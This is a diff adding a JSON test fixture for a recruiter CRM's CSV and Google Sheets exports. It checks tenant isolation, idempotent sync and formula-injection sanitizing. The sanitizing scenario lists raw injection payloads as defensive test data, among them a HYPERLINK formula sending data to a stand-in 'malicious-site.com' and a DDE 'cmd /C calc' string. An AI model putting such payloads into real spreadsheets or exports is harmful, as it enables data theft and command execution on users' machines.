@@ -1,0 +1,134 @@
+{
+  "scenario_title": "LinkedIn Relationship Exports Groundtruth Fixture Suite",
+  "version": "1.0",
+  "generated_date": "2026-09-20",
+  "description": "Multi-workspace groundtruth test suite for private, scoped CSV and Google Sheets relationship exports with formula injection defense and idempotent sync (LI-20, REQ-006, REQ-019, AT-013, AT-014)",
+  "scenarios": [
+    {
+      "scenario_id": "scoped_relationship_csv_export",
+      "description": "Export scoped recruiter relationships to RFC4180 CSV with explicit column selection and timezone labeling (AT-013, REQ-006)",
+      "workspace_id": "ws-alpha",
+      "tenant_id": "tenant-alpha",
+      "requesting_owner_id": "usr-alex-001",
+      "export_options": {
+        "destination": "csv_download",
+        "include_notes": true,
+        "include_person_records": true,
+        "with_bom": true,
+        "timezone": "America/New_York",
+        "selected_columns": [
+          "Lead ID",
+          "Recruiter Name",
+          "Recruiter Title",
+          "Company",
+          "LinkedIn URL",
+          "Status",
+          "Outreach Stage",
+          "Related Job ID",
+          "Notes",
+          "Follow-Up Reminder"
+        ]
+      },
+      "expected_rows_count": 2,
+      "expected_headers_count": 10,
+      "expected_bom_present": true,
+      "expected_notes_included": true
+    },
+    {
+      "scenario_id": "formula_injection_defense",
+      "description": "Verify malicious formula injection strings starting with =, +, -, @, \\t, \\r are sanitized with single quote prefix (AT-013)",
+      "workspace_id": "ws-alpha",
+      "tenant_id": "tenant-alpha",
+      "requesting_owner_id": "usr-alex-001",
+      "test_inputs": [
+        {
+          "field": "notes",
+          "raw_value": "=HYPERLINK(\"http://malicious-site.com/steal?data=\", \"Click Here\")",
+          "expected_sanitized_value": "'=HYPERLINK(\"http://malicious-site.com/steal?data=\", \"Click Here\")"
+        },
+        {
+          "field": "company",
+          "raw_value": "+cmd|' /C calc'!A0",
+          "expected_sanitized_value": "'+cmd|' /C calc'!A0"
+        },
+        {
+          "field": "recruiter_title",
+          "raw_value": "-10+20*SUM(A1:A10)",
+          "expected_sanitized_value": "'-10+20*SUM(A1:A10)"
+        },
+        {
+          "field": "recruiter_name",
+          "raw_value": "@SUM(1+1)*cmd",
+          "expected_sanitized_value": "'@SUM(1+1)*cmd"
+        }
+      ],
+      "expected_formula_neutralized": true
+    },
+    {
+      "scenario_id": "cross_tenant_export_denial",
+      "description": "Tenant isolation barrier prevents tenant-beta from reading or exporting tenant-alpha relationship contacts or notes (AT-011, AT-012, REQ-019)",
+      "requesting_workspace_id": "ws-beta",
+      "requesting_tenant_id": "tenant-beta",
+      "target_workspace_id": "ws-alpha",
+      "target_tenant_id": "tenant-alpha",
+      "expected_allowed": false,
+      "expected_error": "cross-tenant relationship export denied"
+    },
+    {
+      "scenario_id": "idempotent_sheets_reconciliation",
+      "description": "Reconcile relationship records into Google Sheets projection without duplicate rows even after candidate row sorting, preserving custom user notes columns (AT-014)",
+      "workspace_id": "ws-alpha",
+      "tenant_id": "tenant-alpha",
+      "sync_config": {
+        "spreadsheet_id": "sheet-recruiter-crm-001",
+        "sheet_name": "Relationship_CRM",
+        "timezone": "UTC",
+        "include_notes": false,
+        "sync_mode": "one_way_upsert"
+      },
+      "simulated_existing_sheet": {
+        "headers": [
+          "Lead ID",
+          "Recruiter Name",
+          "Recruiter Title",
+          "Company",
+          "LinkedIn URL",
+          "Status",
+          "Outreach Stage",
+          "Related Job ID",
+          "Candidate Private Evaluation (Custom Column)"
+        ],
+        "rows": [
+          [
+            "lead-alpha-002",
+            "Elena Rostova",
+            "Director of Engineering",
+            "Cloudflare",
+            "https://www.linkedin.com/in/elena-rostova-tech",
+            "new",
+            "draft",
+            "job-alpha-002",
+            "Candidate Custom Note: Top choice team"
+          ],
+          [
+            "lead-alpha-001",
+            "Marcus Vance",
+            "Principal Talent Acquisition Partner",
+            "Stripe",
+            "https://www.linkedin.com/in/marcus-vance-talent",
+            "in_dialogue",
+            "replied",
+            "job-alpha-001",
+            "Candidate Custom Note: Good compensation band"
+          ]
+        ]
+      },
+      "expected_reconciliation": {
+        "appended_count": 0,
+        "updated_count": 2,
+        "custom_column_preserved": true,
+        "duplicate_rows_created": false
+      }
+    }
+  ]
+}
